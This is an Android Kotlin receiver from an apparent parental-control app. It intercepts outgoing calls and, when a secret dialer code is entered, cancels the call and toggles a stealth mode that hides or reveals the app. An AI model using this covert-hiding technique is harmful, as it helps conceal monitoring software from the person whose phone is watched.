package com.example.parentalcontrol

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * SecretCodeReceiver v27
 *
 * This receiver handles the fallback for dialer codes via NEW_OUTGOING_CALL.
 * The primary SECRET_CODE handler is now SecretCodeActivity for better
 * reliability on Android 14+ (Samsung).
 */
class SecretCodeReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SecretCodeReceiver"
        private const val SECRET_HOST = "1356365508"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.i(TAG, "onReceive action=$action")

        // Intercept outgoing call before it connects.
        // On some Samsung versions, this is more reliable if the secret code 
        // broadcast doesn't fire.
        if (action == Intent.ACTION_NEW_OUTGOING_CALL) {
            val raw = resultData 
                ?: intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
                ?: return

            // Strip everything except digits
            val digits = raw.replace(Regex("[^0-9]"), "")
            if (digits == SECRET_HOST) {
                Log.i(TAG, "✅ NEW_OUTGOING_CALL matched $SECRET_HOST — cancelling call + toggling stealth")
                
                // Abort the outgoing call so it doesn't actually dial out
                setResultData(null)
                
                // Toggle the stealth state (Hide/Show)
                StealthManager.toggleStealthMode(context)
            }
        }
    }
}
